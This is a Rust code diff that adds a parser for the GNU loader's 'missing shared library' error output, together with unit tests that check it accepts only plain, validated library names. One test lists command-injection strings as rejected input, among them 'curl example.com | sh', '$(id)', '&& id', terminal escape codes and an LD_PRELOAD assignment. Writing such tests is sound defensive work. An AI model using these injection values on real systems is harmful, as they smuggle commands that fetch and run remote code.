@@ -52,7 +52,7 @@ use vsift_application::{
     LocalAsrVerificationFailure, LocalAsrVerifier, MediaToolFailure, MediaToolVerification,
     MediaToolVerifier, RecognizerIdentity, ReviewedCompatibilityPolicy, SpeechRecognitionError,
 };
-use vsift_domain::ManagedComponent;
+use vsift_domain::{ManagedComponent, SharedLibraryName};
 
 use crate::{
     ExecutableResolutionError, FixtureAsrVerifier, FixtureMediaToolVerifier, HostIsolation,
@@ -392,7 +392,12 @@ impl<V: SmokeFixtureVerifiers> StagedCompatibilitySmoke<V> {
             .map_err(|error| spawn_reason(&error))?;
         match outcome.termination {
             TerminationReason::Exited if outcome.status.success() => {}
-            TerminationReason::Exited => return Err(Reason::ProviderFailed),
+            // A program the loader could not start says so in its own error
+            // output; only the library's validated file name is taken from it.
+            TerminationReason::Exited => {
+                return Err(missing_shared_library(&outcome.stderr.bytes)
+                    .map_or(Reason::ProviderFailed, Reason::MissingSharedLibrary));
+            }
             TerminationReason::Deadline => return Err(Reason::DeadlineExceeded),
             TerminationReason::OutputLimit(_) => return Err(Reason::OutputOverBound),
             TerminationReason::Cancelled => return Err(Reason::Cancelled),
@@ -558,6 +563,31 @@ fn is_executable_format_error(error: &io::Error) -> bool {
 #[cfg(not(any(unix, windows)))]
 fn is_executable_format_error(_error: &io::Error) -> bool {
     false
+}
+
+/// The words the GNU dynamic loader prints, on the program's own standard
+/// error, when a shared library the program needs is not installed:
+/// `<program>: error while loading shared libraries: <name>: cannot open
+/// shared object file: No such file or directory`.
+const LOADER_MARKER: &str = "error while loading shared libraries: ";
+const LOADER_CANNOT_OPEN: &str = ": cannot open shared object file";
+
+/// The shared library a program's error output says the loader could not
+/// find (#256), or `None`.
+///
+/// The output is untrusted text: the program is the user's tool or a reviewed
+/// archive's, and either may print anything. Only the first line holding the
+/// loader's marker is read, only the text between the marker and the fixed
+/// ending is considered, and only a name that [`SharedLibraryName::parse`]
+/// accepts (a plain library file name: no path, space or punctuation a shell
+/// or terminal acts on) is returned. Nothing else of the output is kept.
+fn missing_shared_library(standard_error: &[u8]) -> Option<SharedLibraryName> {
+    let text = String::from_utf8_lossy(standard_error);
+    let after_marker = text
+        .lines()
+        .find_map(|line| line.split_once(LOADER_MARKER).map(|(_, after)| after))?;
+    let (name, _) = after_marker.split_once(LOADER_CANNOT_OPEN)?;
+    SharedLibraryName::parse(name)
 }
 
 const fn media_reason(failure: MediaToolFailure) -> Reason {
@@ -750,8 +780,76 @@ mod tests {
 
     use super::{
         Container, ExecutableFormat, classify_executable_header, first_line, media_reason,
-        speech_reason,
+        missing_shared_library, speech_reason,
     };
+
+    fn named(standard_error: &str) -> Option<String> {
+        missing_shared_library(standard_error.as_bytes()).map(|name| name.as_str().to_owned())
+    }
+
+    /// The loader's own words give the library; anything else is nothing.
+    #[test]
+    fn only_the_loaders_fixed_words_name_a_missing_library() {
+        let loader = "whisper-cli: error while loading shared libraries: libgomp.so.1: cannot open shared object file: No such file or directory\n";
+        assert_eq!(named(loader), Some("libgomp.so.1".to_owned()));
+        // Output before and after, a prefix path, other libraries after the first.
+        assert_eq!(
+            named(&format!(
+                "warming up\n/opt/tool/bin/whisper-cli: error while loading shared libraries: libstdc++.so.6: cannot open shared object file: No such file or directory\n{loader}"
+            )),
+            Some("libstdc++.so.6".to_owned())
+        );
+        // Not the loader's words: other failures, a truncated line, an empty name.
+        for other in [
+            "",
+            "whisper-cli: fixture failure\n",
+            "error while loading shared libraries: \n",
+            "error while loading shared libraries: libgomp.so.1\n",
+            "error while loading shared libraries: libgomp.so.1: no such thing\n",
+            "error while loading shared libraries: : cannot open shared object file\n",
+            "libgomp.so.1: cannot open shared object file: No such file or directory\n",
+            "whisper-cli: error while loading shared object: libgomp.so.1: cannot open shared object file\n",
+        ] {
+            assert_eq!(named(other), None, "{other:?}");
+        }
+    }
+
+    /// The output is untrusted: a name that is a path, carries shell or
+    /// terminal syntax or is too long is dropped, never shown.
+    #[test]
+    fn a_hostile_name_in_the_loaders_words_is_dropped() {
+        for name in [
+            "/usr/lib/libgomp.so.1",
+            "../libgomp.so.1",
+            "libgomp.so.1; curl example.com | sh",
+            "libgomp.so.1 && id",
+            "libgomp$(id).so.1",
+            "`id`",
+            "libgomp.so.1\u{1b}[2J",
+            "libgomp\u{202e}.so.1",
+            "libg\u{f6}mp.so.1",
+            "LD_PRELOAD=libgomp.so.1",
+        ] {
+            let output = format!(
+                "x: error while loading shared libraries: {name}: cannot open shared object file: No such file or directory\n"
+            );
+            assert_eq!(named(&output), None, "{name:?}");
+        }
+        let long = "a".repeat(5_000);
+        assert_eq!(
+            named(&format!(
+                "x: error while loading shared libraries: lib{long}.so.1: cannot open shared object file\n"
+            )),
+            None
+        );
+        // Bytes that are not UTF-8 never panic and never name a library.
+        assert_eq!(
+            missing_shared_library(
+                b"x: error while loading shared libraries: libgomp\xff.so.1: cannot open shared object file\n"
+            ),
+            None
+        );
+    }
 
     fn elf(machine: u16) -> Vec<u8> {
         let mut header = vec![0_u8; 64];
